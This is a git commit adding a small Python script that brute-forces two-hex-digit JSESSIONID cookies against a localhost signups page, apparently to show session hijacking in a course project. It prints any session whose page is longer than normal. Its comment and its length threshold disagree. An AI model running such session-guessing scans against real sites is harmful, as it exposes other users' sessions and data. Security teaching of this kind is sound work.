93501af39c115af4a1a0f2051fc83244718a1e4b
ahtipell <ahti.pellinen@phnet.fi>
2017-02-24 14:54:59 +0200

    Add files via upload
    Uploaded really really basic JSESSIONID-scanner to demo the possibility to hijack the session in this course project.

---
+++ Scripts/session-hijack-scanner.py
@@ -0,0 +1,25 @@
+import requests
+import time
+
+url = "http://localhost:8080/signups.html"
+
+for i in range(0, 256):
+    cookieValue = format(i, '02X')
+    header = {'Cookie': 'JSESSIONID=%s;' % cookieValue}
+    print header
+    
+    response = requests.get(url, headers=header)        
+    
+    if response.status_code == 200:
+        # Normal response.content is 558, so more than that, there should be
+	# items in the cart.
+	print len(response.content)
+		
+        if (len(response.content) > 452):
+	    print "Found open session with JSESSIONID Cookie %s" % cookieValue
+	    print response.content
+	    break
+	# some trottle for the sake of siem...	
+	time.sleep(0.1)
+print "End of script"
+
